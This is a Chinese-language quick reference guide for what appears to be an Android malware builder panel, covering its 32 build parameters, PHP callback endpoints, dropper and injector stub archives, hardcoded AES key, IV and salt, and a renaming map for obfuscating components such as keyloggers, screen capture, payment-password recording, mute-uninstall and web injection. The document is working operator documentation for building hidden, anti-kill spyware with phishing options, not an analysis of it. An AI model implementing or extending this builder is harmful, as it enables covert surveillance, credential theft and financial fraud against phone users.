# 快速参考指南

## 核心参数（32个）

| 索引 | 参数名 | 说明 | 示例 |
|------|--------|------|------|
| 0 | appid | 应用ID | app123 |
| 1 | userid | 用户ID | user456 |
| 2 | ClientName | 客户端名称 | MyClient |
| 3 | Email | 邮箱（加密） | user@example.com |
| 4 | MainActivity | 主Activity | com.example.MainActivity |
| 5 | appdir | 应用目录 | apps |
| 6 | UserHost | 用户主机 | example.com |
| 7 | use_access | 无障碍服务 | 1/0 |
| 8 | use_antkill | 防杀软 | 1/0 |
| 9 | use_atoprims | 自动授权 | 1/0 |
| 10 | notifytitle | 通知标题 | Title |
| 11 | notifymsg | 通知消息 | Message |
| 12 | allprims | 所有权限 | 1/0 |
| 13 | blackprims | 黑名单权限 | 1/0 |
| 14 | Buildtype | 构建类型 | S/C |
| 15 | appname | 应用名称 | MyApp |
| 16 | appversion | 应用版本 | 1.0.0 |
| 17 | appicopath | 图标路径 | icon.png |
| 18 | appurl | 应用URL（加密） | http://example.com |
| 19 | logintitle | 登录标题 | Login |
| 20 | logindis | 登录描述 | Please login |
| 21 | loginbtn | 登录按钮 | Sign In |
| 22 | lngshort | 语言代码 | en |
| 23 | hiddenapp | 隐藏应用 | 1/0 |
| 24 | noemulator | 禁用模拟器 | 1/0 |
| 25 | installtype | 安装类型 | 0/1 |
| 26 | hidetype | 隐藏类型 | 0/1 |
| 27 | use_draw | 悬浮窗 | 1/0 |
| 28 | open_access | 开启无障碍 | 1/0 |
| 29 | descr_iption | 描述 | Description |
| 30 | diao_type | 钓鱼类型 | 0/1 |
| 31 | (reserved) | 预留 | - |

## HTTP 回调格式

### UpdateState 回调
```json
POST /private/Eaod90061.php
{
    "userid": "user456",
    "appid": "app123",
    "subcom": "onbuild|finished|failed"
}
```

### InsertApp 回调（自定义应用）
```json
POST /private/Eaod91370.php
{
    "userid": "user456",
    "appid": "app123",
    "apppath": "C:\\...\\user\\apps\\user456\\app123\\app123.apk",
    "subcom": "onbuild",
    "appname": "MyApp",
    "appico": "user456/icons/icon.png"
}
```

### InsertApp 回调（Store应用）
```json
POST /private/Eaod90061.php
{
    "userid": "user456",
    "appid": "app123",
    "apppath": "C:\\...\\user\\apps\\user456\\app123\\app123.apk",
    "subcom": "onbuild"
}
```

## 关键文件路径

```
WorkingDir/
├── private/
│   ├── apkstub/
│   │   ├── apkstub.zip          # 完整权限Stub
│   │   ├── apkstubg.zip         # 部分权限Stub
│   │   ├── dropstub.zip         # 下载器Stub
│   │   └── jectstub.zip         # 注入Stub
│   ├── Eaod90061.php            # 主回调接口
│   └── Eaod91370.php            # 自定义应用回调
│
├── user/
│   ├── apps/
│   │   └── {userid}/
│   │       └── {appid}/
│   │           └── {appid}.apk
│   └── storage/
│       └── {userid}/
│           └── icons/
│               └── {icon}.png
│
└── {appdir}/
    ├── {appid}.zip
    └── ico.png
```

## 加密密钥

```
IV: 2230209522049090
Password: 4814780584699673
Salt: 2894356330652558
Algorithm: AES-128-CBC
Iterations: 65536
```

## 类名混淆列表（部分）

```
AccessibilityActivity → N_AccessibilityActivity
AccessServices → N_AccessServices
HiddenBrowser → N_HiddenBrowser
AccessTools → N_AccessTools
ActivityCaptureScreen → N_ActivityCaptureScreen
ActivityMonitors → NActivityMonitors
_update_app_ → N_update_app_
Consts → N__Consts_
Codes → N__Codes_
ChatActivity → N__ChatActivity_
CameraCap → N_CameraCap
Contct_manager → N_Contct_manager
Deviceinfo → N_Deviceinfo
filesManager → N_filesManager
id_Commands → N_id_Commands
KeyStorksQ → N_KeyStorksQ
LiveChat → N_LiveChat
QueryChats → N_QueryChats
LiveKeysStrok → N_LiveKeysStrok
StarterServices → N_StarterServices
LocationMonitor → N_LocationMonitor
LockAppsActivity → N_LockAppsActivity
ActivMain → N_ActivMain
MyLoger → N_MyLoger
MyNotification → N_MyNotification
MyPacket → N_MyPacket
My_Configs → N_My_Configs
ActivityDraw → N_ActivityDraw
My_Crpter → N_My_Crpter
MySettings → N_MySettings
PermissionsActivity → N_PermissionsActivity
RecordPayPassWord → N_RecordPayPassWord
RequestDraw → N_RequestDraw
MuteUninstall → N_MuteUninstall
RequestPermissions2 → N_RequestPermissions2
ScreenCaps → N_ScreenCaps
ScreenReceiver → N_ScreenReceiver
StatusMonitor → N_StatusMonitor
UtliTools → N_UtliTools
NotifyListenService → N_NotifyListenService
WorkServices → N_WorkServices
HiddenActivity → N_HiddenActivity
LockActivity → N_LockActivity
RestrectionActivity → N_RestrectionActivity
OPPOAutostart → N_OPPOAutostart
BrodcastActivity → N_BrodcastActivity
AnUninstall → N_AnUninstall
TransparentActivity → N_TransparentActivity
EngineWorker → N_EngineWorker
TransparentLauncherAlias → N_TransparentLauncherAlias
SIMLauncherAlias → N_SIMLauncherAlias
ChromeLauncherAlias → N_ChromeLauncherAlias
OppoLauncherAlias → N_OppoLauncherAlias
VivoLauncherAlias → N_VivoLauncherAlias
MuteActivity → N_MuteActivity
AlertActivity → N_AlertActivity
HiddenIco → N_HiddenIco
WebBrowser → N_WebBrowser
Webjector → N_Webjector
Apps_Manage → N_Apps_Manage
AudioRecorder → N_AudioRecorder
ClassGen → N_ClassGen
```

## 配置值替换

```
[USER_MAIL] → Email
[USE-SUPER] → use_access
[USER_DOM] → UserHost
[USE-NOKILL] → use_antkill
[USE-DRAWOVER] → use_draw
[USE-AUTOGRANT] → use_atoprims
[USE-ALLPRIM] → ASKPRIM_all
[USE-BLACK] → ASKPRIM_black
[USE-HIDDEEN] → hiddenapp
[USE-STORE] → IsStoreMod
[USE-GUID] → installtype
[USE-FAKE] → hidetype
[AST-PAS] → AssetsPass
[Client_N] → ClientName
[_NOTIFI_TITLE_] → notifytitle
[_NOTIFI_MSG_] → notifymsg
[OBFS] → NEWRANDOM
[BSE_URL] → appurl
[log-title] → logintitle
[log-dis] → logindis
[log-btn] → loginbtn
[log-lng] → lngshort
[USE-OOENACC] → open_access
[USE-DIAO] → diao_type
```

## 构建类型

| 类型 | 说明 | 源APK | 输出路径 |
|------|------|-------|---------|
| S | Store模式 | {appdir}/{appid}.zip | user/apps/{userid}/{appid}/{appid}.apk |
| C | Custom模式 | user/storage/{userid}/icons/{appicopath} | user/apps/{userid}/{appid}/{appid}.apk |

## 状态转换

```
pending
  ↓
building (UpdateState: onbuild)
  ↓
finished (UpdateState: finished)
  ↓
ready (InsertApp: onbuild)

或

pending
  ↓
building (UpdateState: onbuild)
  ↓
failed (UpdateState: failed)
```

## PHP 实现检查清单

- [ ] 参数验证（32个参数）
- [ ] Base64 编码/解码
- [ ] AES-CBC 加密/解密
- [ ] 调用 EaodStarter.exe
- [ ] 监听 HTTP 回调
- [ ] 更新数据库状态
- [ ] 文件存储管理
- [ ] 错误处理和日志
- [ ] 安全验证（输入、文件、路径）
- [ ] 性能优化（异步、缓存）

## 常见错误

| 错误 | 原因 | 解决方案 |
|------|------|---------|
| Invalid parameter count | 参数数量不对 | 检查是否有32个参数 |
| APK file not found | APK文件不存在 | 检查文件路径和权限 |
| Output directory not writable | 输出目录无写权限 | 检查目录权限 |
| Encryption failed | 加密失败 | 检查密钥和IV |
| Invalid base64 encoding | Base64编码错误 | 检查编码格式 |
| HTTP callback timeout | 回调超时 | 检查网络连接 |
| Process not found | 进程未启动 | 检查EXE文件路径 |

## 调试技巧

```php
// 打印参数
var_dump($params);

// 打印加密结果
echo "Encrypted: " . $crypter->encrypt($data);

// 打印解密结果
echo "Decrypted: " . $crypter->decrypt($encrypted);

// 打印HTTP请求
echo "Request: " . json_encode($postData);

// 打印HTTP响应
echo "Response: " . $response;

// 打印文件路径
echo "APK Path: " . $apkPath;

// 打印数据库状态
var_dump($dbStatus);
```

## 性能指标

| 指标 | 目标 | 说明 |
|------|------|------|
| 参数解析 | < 100ms | Base64解码 |
| 加密/解密 | < 500ms | AES-CBC |
| 进程启动 | < 1s | EaodStarter.exe |
| APK构建 | < 30s | 完整流程 |
| HTTP回调 | < 5s | 网络请求 |
| 数据库更新 | < 100ms | SQL操作 |

